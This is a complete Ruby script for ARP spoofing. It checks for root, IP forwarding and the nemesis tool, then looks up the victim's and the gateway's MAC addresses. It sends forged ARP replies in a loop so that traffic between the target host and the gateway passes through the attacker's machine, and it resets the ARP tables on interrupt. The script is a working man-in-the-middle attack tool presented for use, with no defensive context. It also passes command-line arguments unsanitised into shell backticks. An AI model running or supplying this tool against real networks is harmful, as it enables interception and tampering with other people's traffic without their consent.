#!/usr/bin/env ruby
#by Ivyl
#This script automates ARP spoofing for ipv4

#get parameters
@gateway = ARGV.shift
@target = ARGV.shift
@device = ARGV.shift
@time = ARGV.shift

IP = /([0-9]{1,3}\.){3}[0-9]{1,3}/ #basic checking, not perfect but enough

#checks if user have enabled ipv4 forwarding
def forwarding?
  if File.read("/proc/sys/net/ipv4/ip_forward").chomp == "1" #that's the file (assuming that /proc is mounted)
    puts "[\e[32m+\e[0m] Ipv4 forwarding enabled."
    return true
  else
    puts "[\e[31m-\e[0m] You must enable ipv4 forwarding."
    return false
  end
end

#checks process uid
def allowed?
  if Process.uid == 0
    return true
    puts "[\e[32m+\e[0m] You are root."
  else
    puts "[\e[31m-\e[0m] You must be logged as root in order to do that."
    return false
  end
end

#do you have your nemesis?
def nemesis?
  if File.exists? `which nemesis 2> /dev/null`.chomp
    return true
    puts "[\e[32m+\e[0m] Nemesis is present."
  else
    puts "[\e[31m-\e[0m] You must install nemesis."
    return false
  end
end

def time?
  if @time.nil?
    puts "[\e[33m*\e[0m] No time given. Assuming it is 10s."
    @time = 10
    return true
  elsif @time =~ /^[0-9]+$/
    puts "[\e[32m+\e[0m] Given time: #{@time}."
    @time = @time.to_i
    return true
  else
    puts "[\e[31m-\e[0m] Time have to be number."
    return false
  end
end

def device?
  if @device
    puts "[\e[32m+\e[0m] Given device #{@device}."
  else
    puts "[\e[33m*\e[0m] No device given. Assuming it is eth0."
    @device = "eth0"
  end
  return true
end

def mac_ip?
  begin
    #read setting from ifconfig
    ifconfig = `ifconfig #{@device}`
    @mac = ifconfig.scan(/HWaddr\s+(\S+)/).first.first
    @ip = ifconfig.scan(/inet addr:(\S+)/).first.first
    puts "[\e[32m+\e[0m] You ip: #{@ip} mac: #{@mac}."
  rescue NoMethodError
    puts "[\e[31m-\e[0m] Getting your ip and mac form ifconfig failed."
    return false
  end
  begin
    #whe have to ping our targets
    `ping -c 1 -w 1 #{@gateway} 2> /dev/null`
    `ping -c 1 -w 1 #{@target} 2> /dev/null`
    arp = `arp -n` #then we read data from arp memory
    @target_mac =  arp.scan(/#{@target}\s+ether\s+(\S+)/).first.first #and extracts it
    @gateway_mac = arp.scan(/#{@gateway}\s+ether\s+(\S+)/).first.first
    puts "[\e[32m+\e[0m] Victim ip: #{@target} mac: #{@target_mac}."
    puts "[\e[32m+\e[0m] Gateway ip: #{@gateway} mac: #{@gateway_mac}."
  rescue
    puts "[\e[31m-\e[0m] Getting victim/gateway mac failed."
    return false
  end
    return true
end

#displays help message
def help
  puts
  puts "USAGE: ./arp.rb gateway.ip victim.ip [device] [time]"
  puts "EXAMPLE: ./arp.rb 192.168.0.1 192.168.0.100 eth0 10"
  puts "Params in [] are optional, ip, device and time have to be valid"
  Kernel.exit 1 #exits from program returning error
end

puts "Your network card should be set to promiscous mode (ifconfig ethX promisc)\n\n"

#check for basic settings and options
help if [allowed?, forwarding?, nemesis?, time?, device?, @gateway =~ IP, @target =~ IP, @gateway != @target].any?{|x| x == false || x == nil }

#check for macs and ips
help unless mac_ip?

#set trap for ctrl + c
trap("SIGINT") do
  puts "[\e[32m*\e[0m] Interrupted, reseting to oryginals"
  puts "[\e[32m*\e[0m] Sending ARP: #{@target} will think that #{@gateway} is under #{@gateway_mac}."
  `nemesis arp -r -d #{@device} -S #{@gateway} -D #{@target} -m #{@target_mac} -M #{@target_mac} -H #{@gateway_mac} -h #{@gateway_mac}`
  puts "[\e[32m*\e[0m] Sending ARP: #{@gateway} will think that #{@target} is under #{@target_mac}."
  `nemesis arp -r -d #{@device} -S #{@target} -D #{@gateway} -m #{@gateway_mac} -M #{@gateway_mac} -H #{@target_mac} -h #{@target_mac}`
  Kernel.exit 0
end

loop do 
  puts "[\e[32m*\e[0m] Sending ARP: #{@target} will think that #{@gateway} is under #{@mac}."
  `nemesis arp -r -d #{@device} -S #{@gateway} -D #{@target} -m #{@target_mac} -M #{@target_mac} -H #{@mac} -h #{@mac}`
  puts "[\e[32m*\e[0m] Sending ARP: #{@gateway} will think that #{@target} is under #{@mac}."
  `nemesis arp -r -d #{@device} -S #{@target} -D #{@gateway} -m #{@gateway_mac} -M #{@gateway_mac} -H #{@mac} -h #{@mac}`
  sleep @time
end
